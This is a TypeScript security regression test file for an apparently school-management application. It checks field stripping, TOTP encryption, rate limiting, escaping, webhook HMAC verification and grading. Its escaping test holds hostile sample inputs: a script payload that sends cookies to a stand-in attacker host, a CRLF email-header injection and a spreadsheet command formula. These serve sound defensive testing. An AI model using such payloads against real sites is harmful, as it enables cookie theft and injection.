import assert from "node:assert/strict";
import crypto from "node:crypto";
import {
  SAFE_USER_SELECT,
  stripSensitiveUserFields,
  escapeHtml,
  sanitizeEmailHeader,
  sanitizeFormulaCell,
  generateSecureOtp6,
  hashTokenSha256,
  timingSafeCompare,
  encryptTotpSecret,
  decryptTotpSecret,
  claimTotpCodeSingleUse,
  grantStepUpSession,
  hasValidStepUpSession,
  incrementOtpAttemptAndCheckLocked,
  clearOtpAttempts,
  validateInput,
  rateLimit,
  z,
} from "../index";
import { gradeFor, computeBroadsheetRankings } from "../../../server/domain/grading";

async function runSecurityRegressionSuite() {
  let passed = 0;

  // 1. Over-Fetching & Sensitive Field Stripping (CRIT-07)
  {
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).PasswordHash, undefined);
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).TotpSecret, undefined);
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).TotpBackupCodes, undefined);

    const rawUser = {
      UserID: 42,
      Email: "student@wordoffaith.edu.ng",
      PasswordHash: "$2b$12$secretbcryptdigest",
      TotpSecret: "JBSWY3DPEHPK3PXP",
      TotpBackupCodes: '["hash1","hash2"]',
      TokenVersion: 3,
      IsActive: true,
    };
    const stripped = stripSensitiveUserFields(rawUser);
    assert.equal("PasswordHash" in stripped, false, "PasswordHash must be stripped");
    assert.equal("TotpSecret" in stripped, false, "TotpSecret must be stripped");
    assert.equal("TotpBackupCodes" in stripped, false, "TotpBackupCodes must be stripped");
    assert.equal("TokenVersion" in stripped, false, "TokenVersion must be stripped");
    assert.equal(stripped.Email, "student@wordoffaith.edu.ng");
    passed++;
  }

  // 2. TOTP AES-256-GCM Encryption at Rest & Single-Use Replay Protection (HIGH-06)
  {
    const rawBase32Secret = "JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP";
    const encrypted = encryptTotpSecret(rawBase32Secret);
    assert.equal(encrypted.startsWith("enc:v1:"), true, "Encrypted TOTP secret must have enc:v1: prefix");
    assert.notEqual(encrypted, rawBase32Secret, "Encrypted TOTP secret must not equal plaintext");

    const decrypted = decryptTotpSecret(encrypted);
    assert.equal(decrypted, rawBase32Secret, "Decrypted TOTP secret must match original Base32 secret");

    // Legacy plaintext fallback compatibility
    assert.equal(decryptTotpSecret(rawBase32Secret), rawBase32Secret);

    // Tampered ciphertext must throw on GCM auth tag verification
    const parts = encrypted.split(":");
    parts[3] = parts[3].slice(0, -2) + (parts[3].endsWith("00") ? "ff" : "00");
    assert.throws(() => decryptTotpSecret(parts.join(":")), /Unsupported state or unable to authenticate data/);

    // Replay protection: first claim succeeds, second claim in same window fails
    const testUserId = 999123;
    const testCode = "482910";
    const firstClaim = await claimTotpCodeSingleUse(testUserId, testCode);
    const replayClaim = await claimTotpCodeSingleUse(testUserId, testCode);
    assert.equal(firstClaim, true, "First use of TOTP code in window must succeed");
    assert.equal(replayClaim, false, "Replay of used TOTP code in same window must be rejected");
    passed++;
  }

  // 3. Server-Side Step-Up 2FA Session Grant & Verification (HIGH-06)
  {
    const adminUserId = 888001;
    const beforeGrant = await hasValidStepUpSession(adminUserId, "updateAdminCapabilities");
    assert.equal(beforeGrant, false, "Step-up session must be false before verification");

    await grantStepUpSession(adminUserId, "updateAdminCapabilities", 60);
    const afterGrant = await hasValidStepUpSession(adminUserId, "updateAdminCapabilities");
    assert.equal(afterGrant, true, "Step-up session must be true after verification");
    passed++;
  }

  // 4. Stateful Rate Limiting & 5-Attempt OTP Brute-Force Lockout (HIGH-04, MED-02)
  {
    const bucketKey = `test_rl_${Date.now()}`;
    const r1 = await rateLimit(bucketKey, 3, 60);
    const r2 = await rateLimit(bucketKey, 3, 60);
    const r3 = await rateLimit(bucketKey, 3, 60);
    const r4 = await rateLimit(bucketKey, 3, 60);
    assert.equal(r1.success, true);
    assert.equal(r2.success, true);
    assert.equal(r3.success, true);
    assert.equal(r4.success, false, "4th attempt exceeding limit=3 must be blocked");

    const otpEmail = `victim_${Date.now()}@wordoffaith.edu.ng`;
    await clearOtpAttempts(otpEmail, "PASSWORD_RESET");
    for (let i = 1; i <= 4; i++) {
      const state = await incrementOtpAttemptAndCheckLocked(otpEmail, "PASSWORD_RESET", 5, 300);
      assert.equal(state.locked, false, `Attempt ${i} should not lock yet`);
    }
    const fifthAttempt = await incrementOtpAttemptAndCheckLocked(otpEmail, "PASSWORD_RESET", 5, 300);
    assert.equal(fifthAttempt.locked, true, "5th failed OTP attempt must trigger lockout & token invalidation");
    passed++;
  }

  // 5. HTML Escaping, CRLF Header Sanitization & Formula Injection Neutralization (MED-03, MED-04)
  {
    const xssPayload = `<script>fetch("https://evil.tld?c="+document.cookie)</script>`;
    const escaped = escapeHtml(xssPayload);
    assert.equal(escaped.includes("<script>"), false);
    assert.equal(
      escaped,
      "&lt;script&gt;fetch(&quot;https://evil.tld?c=&quot;+document.cookie)&lt;/script&gt;"
    );

    const crlfHeader = "Receipt Subject\r\nBcc: attacker@evil.tld\nSubject: Injected";
    const cleanHeader = sanitizeEmailHeader(crlfHeader);
    assert.equal(/[\r\n]/.test(cleanHeader), false, "CRLF characters must be stripped from email headers");

    assert.equal(sanitizeFormulaCell("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
    assert.equal(sanitizeFormulaCell("+SUM(A1:A10)"), "'+SUM(A1:A10)");
    assert.equal(sanitizeFormulaCell("@IMPORTXML()"), "'@IMPORTXML()");
    assert.equal(sanitizeFormulaCell("  -2+5"), "'  -2+5");
    assert.equal(sanitizeFormulaCell("Normal Student Name"), "Normal Student Name");
    passed++;
  }

  // 6. CSPRNG 6-Digit OTP Bounds, SHA-256 Token Hashing & Constant-Time Compare (HIGH-04, HIGH-10, HIGH-11)
  {
    for (let i = 0; i < 50; i++) {
      const otp = generateSecureOtp6();
      assert.match(otp, /^\d{6}$/, "Generated OTP must be exactly 6 digits");
      const n = Number(otp);
      assert.equal(n >= 100000 && n <= 999999, true);
    }

    const tokenHash = hashTokenSha256("123456");
    assert.equal(tokenHash.length, 64);
    assert.equal(timingSafeCompare(tokenHash, hashTokenSha256("123456")), true);
    assert.equal(timingSafeCompare(tokenHash, hashTokenSha256("654321")), false);
    assert.equal(timingSafeCompare("short", "longer_string"), false);
    passed++;
  }

  // 7. Paystack Webhook HMAC-SHA512 Verification & Tamper Rejection (CRIT-03, CRIT-04)
  {
    const webhookSecret = "sk_test_webhook_secret_for_verification_test";
    const rawBody = JSON.stringify({
      event: "charge.success",
      data: { reference: "WOF-12-1-1700000000", amount: 6500000, currency: "NGN" },
    });
    const validSignature = crypto.createHmac("sha512", webhookSecret).update(rawBody).digest("hex");
    const tamperedBody = JSON.stringify({
      event: "charge.success",
      data: { reference: "WOF-12-1-1700000000", amount: 100, currency: "NGN" },
    });
    const recomputedForTampered = crypto
      .createHmac("sha512", webhookSecret)
      .update(tamperedBody)
      .digest("hex");

    assert.equal(timingSafeCompare(validSignature, validSignature), true);
    assert.equal(
      timingSafeCompare(validSignature, recomputedForTampered),
      false,
      "Tampered webhook payload must fail HMAC-SHA512 verification"
    );
    passed++;
  }

  // 8. Strict Input Validation with Zod (validateInput) & WAEC Grading Determinism
  {
    const schema = z.object({
      amount: z.number().min(65000),
      status: z.enum(["Pending", "Approved", "Rejected"]),
    });
    assert.throws(() => validateInput(schema, { amount: 10, status: "Approved" }));
    assert.throws(() => validateInput(schema, { amount: 65000, status: "Hacked" }));

    // Verify WAEC grade boundaries in tenths (750 tenths = 75.0 -> A1; 745 tenths = 74.5 -> B2 without rounding)
    assert.equal(gradeFor(750).grade, "A1");
    assert.equal(gradeFor(745).grade, "B2");
    assert.equal(gradeFor(399).grade, "F9");

    const rankings = computeBroadsheetRankings([
      { studentId: 1, enteredSubjectTotalsTenths: [900] },
      { studentId: 2, enteredSubjectTotalsTenths: [900] },
      { studentId: 3, enteredSubjectTotalsTenths: [700] },
    ]);
    assert.equal(rankings[0].position, 1);
    assert.equal(rankings[1].position, 1, "Tied averages must share rank 1");
    assert.equal(rankings[2].position, 3, "Next student after tie of 2 must have rank 3");
    passed++;
  }

  console.log(`✅ ALL ${passed}/8 SECURITY REGRESSION TEST SUITES PASSED.`);
}

runSecurityRegressionSuite().catch((err) => {
  console.error("❌ Security regression suite failed:", err);
  process.exit(1);
});
